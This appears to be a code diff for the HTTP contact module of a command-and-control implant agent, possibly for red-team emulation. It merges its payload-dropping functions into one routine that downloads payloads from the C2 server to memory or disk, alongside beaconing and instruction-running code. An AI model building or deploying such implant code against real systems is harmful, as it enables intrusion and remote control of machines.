@@ -7,7 +7,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"path/filepath"
-	"strings"
 
 	"../execute"
 	"../util"
@@ -45,16 +44,35 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 	return out
 }
 
-//DropPayloads downloads all required payloads for a command
-func (contact API) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
-	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
-	var droppedPayloads []string
-	for _, payload := range payloads {
-		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, contact.drop(payload, server, uniqueId, platform))
+// Will fetch all required payloads. If writeToDisk is true, then return []byte will be nil, and
+// payload will be written to disk (return string will contain filepath). If writeToDisk is false, then []byte will contain the payload bytes,
+// and the returned string will be an empty string
+func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
+    var retBuf []byte
+    location := ""
+    if len(payload) > 0 {
+		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
+		address := fmt.Sprintf("%s/file/download", server)
+		req, _ := http.NewRequest("POST", address, nil)
+		req.Header.Set("file", payload)
+		req.Header.Set("platform", platform)
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err == nil && resp.StatusCode == ok {
+		    if writeToDisk {
+		        // Write payload to disk.
+		        location = filepath.Join(payload)
+		        util.WritePayload(location, resp)
+		    } else {
+		        // Not writing to disk - return the payload bytes.
+			    buf, err := ioutil.ReadAll(resp.Body)
+			    if err == nil {
+			        retBuf = buf
+			    }
+		    }
 		}
 	}
-	return droppedPayloads
+	return location, retBuf
 }
 
 //RunInstruction runs a single instruction
@@ -75,24 +93,6 @@ func (contact API) C2RequirementsMet(criteria map[string]string) bool {
 	return true
 }
 
-//Drop will download a single payload
-func (contact API) drop(payload string, server string, uniqueID string, platform string) string {
-	location := filepath.Join(payload)
-	if len(payload) > 0 && util.Exists(location) == false {
-		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
-		req, _ := http.NewRequest("POST", address, nil)
-		req.Header.Set("file", payload)
-		req.Header.Set("platform", platform)
-		client := &http.Client{}
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == ok {
-			util.WritePayload(location, resp)
-		}
-	}
-	return location
-}
-
 //SendExecutionResults will send the execution results to the server.
 func (contact API) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
 	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
@@ -100,29 +100,6 @@ func (contact API) SendExecutionResults(profile map[string]interface{}, result m
 	profileCopy["result"] = result
 	data, _ := json.Marshal(profileCopy)
 	request(address, data)
-}
-
-// Will obtain the payload bytes in memory to be written to disk later by caller.
-func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
-    var retBuf []byte
-    if len(payload) > 0 {
-		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
-		req, _ := http.NewRequest("POST", address, nil)
-		req.Header.Set("file", payload)
-		req.Header.Set("platform", platform)
-		client := &http.Client{}
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == ok {
-			buf, err := ioutil.ReadAll(resp.Body)
-
-			if err == nil {
-			    retBuf = buf
-			}
-		}
-	}
-
-	return retBuf
 }
 
 func request(address string, data []byte) []byte {
